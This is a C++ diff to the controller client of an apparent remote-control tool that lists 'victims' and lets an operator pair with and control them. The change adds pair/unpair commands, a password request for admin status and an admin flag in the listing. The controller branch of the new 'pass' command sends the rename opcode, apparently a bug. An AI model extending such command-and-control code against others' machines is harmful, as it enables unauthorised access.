@@ -240,7 +240,7 @@ void Controller::receiveInfo()
         if (cmd == 'n' || cmd == 'l') {
             Client c;
             sf::Uint32 ip;
-            p >> c.id >> c.name >> c.time >> ip >> c.port >> c.otherId;
+            p >> c.id >> c.name >> c.time >> ip >> c.port >> c.otherId >> c.isAdmin;
             c.ip = sf::IpAddress(ip).toString();
             if (cmd == 'n')
                 controllers.push_back(c);
@@ -256,7 +256,7 @@ void Controller::receiveInfo()
         else if (cmd == 'd') {
             displayList();
         }
-        //apparently controller isnt initialized
+        //apparently controller isn't initialized
         else if (cmd == '?') {
             isConnected = false, isPaired = false, isControlling = false;
             break;
@@ -341,9 +341,14 @@ void Controller::takeCmdInput()
         if (!isConnected)
             continue;
 
+        while (cmd.size() > 0 && cmd[0] == ' ')
+            cmd.erase(cmd.begin());
+        while (cmd.size() > 0 && cmd[cmd.size() - 1] == ' ')
+            cmd.erase(cmd.begin() + cmd.size() - 1);
+
         //connect to a given victim
-        if (cmd.substr(0, 7) == "connect" && !isPaired) {
-            cmd.erase(0, 7);
+        if (cmd.substr(0, 4) == "pair" && !isPaired) {
+            cmd.erase(0, 4);
 
             //convert string to  number and check if it is valid
             int num = 0;
@@ -369,10 +374,43 @@ void Controller::takeCmdInput()
             }
         }
         //disconnect from victim
-        else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
-            sf::Packet p;
-            p << sf::Uint8('u');
-            sendServer(p);
+        else if (cmd.substr(0, 6) == "unpair") {
+            cmd.erase(0, 6);
+
+            int num = 0;
+            try {
+                num = stoi(cmd);
+            }
+            catch (std::invalid_argument e) {
+                continue;
+            }
+            catch (std::out_of_range e) {
+                continue;
+            }
+
+            //check if client with that id exists
+            for (const auto& v : victims) {
+                if (v.id != num)
+                    continue;
+                if (v.otherId == 0)
+                    break;
+
+                sf::Packet p;
+                p << sf::Uint8('u') << v.id;
+                sendServer(p);
+                break;
+            }
+            for (const auto& c : controllers) {
+                if (c.id != num)
+                    continue; 
+                if (c.otherId == 0)
+                    break;
+
+                sf::Packet p;
+                p << sf::Uint8('u') << c.id;
+                sendServer(p);
+                break;
+            }
         }
         //start controlling the victim
         else if (cmd.substr(0, 7) == "control" && isPaired) {
@@ -435,11 +473,11 @@ void Controller::takeCmdInput()
             }
 
             //remove spaces from before and after the string
-            std::string name = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
-            while (name.size() > 0 && name[0] == ' ')
-                name.erase(name.begin());
-            while (name.size() > 0 && name[name.size() - 1] == ' ')
-                name.erase(name.begin() + name.size() - 1);
+            std::string newName = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
+            while (newName.size() > 0 && newName[0] == ' ')
+                newName.erase(newName.begin());
+            while (newName.size() > 0 && newName[newName.size() - 1] == ' ')
+                newName.erase(newName.begin() + newName.size() - 1);
 
             //check if client with that id exists
             for (const auto& v : victims) {
@@ -447,7 +485,7 @@ void Controller::takeCmdInput()
                     continue;
 
                 sf::Packet p;
-                p << sf::Uint8('w') << v.id << name;
+                p << sf::Uint8('w') << v.id << newName;
                 sendServer(p);
                 break;
             }
@@ -456,7 +494,53 @@ void Controller::takeCmdInput()
                     continue;
 
                 sf::Packet p;
-                p << sf::Uint8('w') << c.id << name;
+                p << sf::Uint8('w') << c.id << newName;
+                sendServer(p);
+                break;
+            }
+        }
+        //ask for admin
+        else if (cmd.substr(0, 4) == "pass") {
+            cmd.erase(0, 4);
+            //check if input is valid
+            if (cmd.find(':') == std::string::npos)
+                continue;
+
+            //convert string to  number and check if it is valid
+            int num = 0;
+            try {
+                num = stoi(cmd.substr(0, cmd.find(':')));
+            }
+            catch (std::invalid_argument e) {
+                continue;
+            }
+            catch (std::out_of_range e) {
+                continue;
+            }
+
+            //remove spaces from before and after the string
+            std::string pass = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
+            while (pass.size() > 0 && pass[0] == ' ')
+                pass.erase(pass.begin());
+            while (pass.size() > 0 && pass[pass.size() - 1] == ' ')
+                pass.erase(pass.begin() + pass.size() - 1);
+
+            //check if client with that id exists
+            for (const auto& v : victims) {
+                if (v.id != num)
+                    continue;
+
+                sf::Packet p;
+                p << sf::Uint8('q') << v.id << pass;
+                sendServer(p);
+                break;
+            }
+            for (const auto& c : controllers) {
+                if (c.id != num)
+                    continue;
+
+                sf::Packet p;
+                p << sf::Uint8('w') << c.id << pass;
                 sendServer(p);
                 break;
             }
@@ -505,9 +589,13 @@ void Controller::displayList()
             std::cout << " (you)";
         std::cout << " = " << c.ip << ':' << c.port << " - time: " << c.time;
         if (c.otherId == 0)
-            std::cout << " - not paired\n";
+            std::cout << " - not paired";
         else
-            std::cout << " - paired with " << c.otherId << "\n";
+            std::cout << " - paired with " << c.otherId;
+
+        if (c.isAdmin)
+            std::cout << " - ADMIN";
+        std::cout << "\n";
     }
 
     std::cout << "\nVICTIMS:\n";
